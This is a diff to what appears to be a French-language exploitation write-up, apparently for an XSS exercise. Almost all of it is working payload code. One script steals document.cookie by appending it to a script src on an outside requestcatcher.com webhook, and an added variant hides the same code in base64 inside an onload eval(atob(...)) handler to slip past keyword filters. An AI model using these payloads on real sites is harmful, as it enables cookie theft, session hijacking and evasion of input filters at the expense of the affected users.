@@ -14,11 +14,11 @@ Webhook : https://busterbaxter.requestcatcher.com/
 ```js
 // Pour exploiter
 <script>
-var url="https://busterbaxter.requestcatcher.com/";
-var extra=document.cookie;
-
 var script = document.createElement("script");
-script.src = url + extra;
+script.src = "https://busterbaxter.requestcatcher.com/" + document.cookie;
 document.body.appendChild(script);
 </script>:-)
+
+// Pour bypass les filtres qui recherchent des mots clés : base64 encoded payload
+<body onload="eval(atob('dmFyIHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO3NjcmlwdC5zcmMgPSAiaHR0cHM6Ly9idXN0ZXJiYXh0ZXIucmVxdWVzdGNhdGNoZXIuY29tLyIgKyBkb2N1bWVudC5jb29raWU7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzY3JpcHQpOw=='))">
 ```
